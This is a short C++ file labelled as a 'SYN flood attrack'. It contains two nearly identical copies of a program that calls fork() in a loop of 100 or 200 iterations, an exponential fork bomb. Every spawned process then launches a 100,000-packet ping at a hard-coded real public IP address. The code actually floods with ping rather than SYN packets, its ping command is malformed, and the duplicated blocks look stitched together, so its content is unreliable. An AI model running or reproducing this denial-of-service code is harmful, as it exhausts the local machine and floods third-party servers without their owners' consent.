/* SYN flood attrack */


#include <bits/stdc++.h>
#include <sys/resource.h>
#include <sys/types.h>
#include <signal.h>
#include <unistd.h>
using namespace std;
int main()
{
  
  //fork();
  //fork();
  //fork();
	static int i=0;
  for(;i<100;i++)
  	fork();
  system("ping 100 3.110.214.241 -c 100000");
  
  //for(;;) cout<<"fg "<<endl;
  return 0;
}









#include <bits/stdc++.h>
#include <sys/resource.h>
#include <sys/types.h>
#include <signal.h>
#include <unistd.h>
using namespace std;
int main()
{
  
  //fork();
  //fork();
  //fork();
	static int i=0;
  for(;i<200;i++)
  	fork();
  system("ping 100 3.109.213.173 -c 100000");
  
  //for(;;) cout<<"fg "<<endl;
  return 0;
}